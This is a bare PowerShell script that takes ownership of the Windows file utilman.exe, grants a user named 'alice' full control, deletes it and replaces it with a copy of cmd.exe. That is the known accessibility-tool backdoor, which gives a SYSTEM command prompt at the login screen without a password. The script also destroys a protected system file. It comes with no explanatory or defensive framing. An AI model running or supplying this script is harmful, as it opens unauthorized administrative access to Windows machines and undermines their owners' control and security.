# Define the paths
$utilmanPath = "C:\Windows\System32\utilman.exe"
$cmdPath = "C:\Windows\System32\cmd.exe"

# Take ownership of utilman.exe
takeown /f $utilmanPath
icacls $utilmanPath /grant alice:F

# Remove utilman.exe
Remove-Item $utilmanPath -Force

# Copy cmd.exe to utilman.exe
Copy-Item $cmdPath -Destination $utilmanPath
